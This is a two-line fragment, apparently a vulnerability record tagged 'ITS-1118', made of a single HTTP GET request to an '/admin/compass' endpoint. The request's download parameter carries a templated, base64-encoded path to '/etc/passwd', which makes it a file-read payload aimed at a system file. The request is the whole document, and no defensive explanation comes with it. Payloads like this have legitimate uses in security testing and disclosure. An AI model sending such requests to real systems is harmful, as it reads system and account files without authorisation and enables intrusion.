# Vulnerable: ITS-1118
GET /admin/compass?download={{base64('/etc/passwd')}}
